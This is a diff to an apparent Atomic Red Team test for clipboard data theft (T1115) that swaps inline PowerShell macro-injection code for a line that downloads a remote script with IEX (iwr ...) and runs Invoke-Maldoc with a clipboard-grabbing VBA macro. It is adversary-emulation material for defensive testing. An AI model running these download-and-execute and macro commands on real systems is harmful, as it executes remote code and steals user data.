@@ -50,18 +50,6 @@ atomic_tests:
       description: Maldoc application Word
       type: String
       default: Word
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
-    sub_name:
-      description: Name of Sub to execute
-      type: String
-      default: Getclipboard
-    macrocode:
-      description: Path to Macrocode to execute
-      type: Path
-      default: PathToAtomicsFolder\T1115\src\T1115-macrocode.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -78,23 +66,8 @@ atomic_tests:
   executor:
     command: |
       Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
-      $wdApp = New-Object -COMObject "Word.Application"
-      $wdApp.Visible = $true
-      $wdDoc = $wdApp.Documents.Add()
-      $wdDoc.VBProject.References.AddFromFile("C:\Windows\system32\FM20.DLL") | Out-Null
-      $macro = [System.IO.File]::ReadAllText("#{macrocode}")
-      $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)
-      $vbaModule.CodeModule.AddFromString($macro) | Out-Null
-      $wdApp.Run("#{sub_name}")
-      $wdDoc.Close($false)
-      $wdApp.Quit()
-      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
-      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
-      [System.GC]::Collect()
-      [System.GC]::WaitForPendingFinalizers()
-      Remove-Variable wdDoc
-      Remove-Variable wdApp
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
     cleanup_command: |
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
       Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt" -ErrorAction Ignore
     name: powershell
